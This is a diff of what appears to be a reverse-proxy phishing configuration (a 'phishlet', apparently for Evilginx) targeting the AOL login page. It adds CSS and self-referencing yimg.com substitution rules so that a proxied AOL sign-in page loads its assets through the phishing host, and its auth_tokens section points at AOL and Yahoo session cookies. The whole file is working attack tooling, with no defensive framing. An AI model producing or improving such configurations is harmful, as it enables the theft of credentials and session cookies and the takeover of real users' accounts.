@@ -15,9 +15,12 @@ sub_filters:
   - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   # yimg.com (Yahoo/AOL shared CDN) sub-filters
-  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/css', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  # yimg.com self-referencing sub-filters (for CSS background-image URLs within yimg responses)
+  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/css', 'text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/css', 'text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   # AOL runs on Yahoo's auth infrastructure — same core session cookies apply
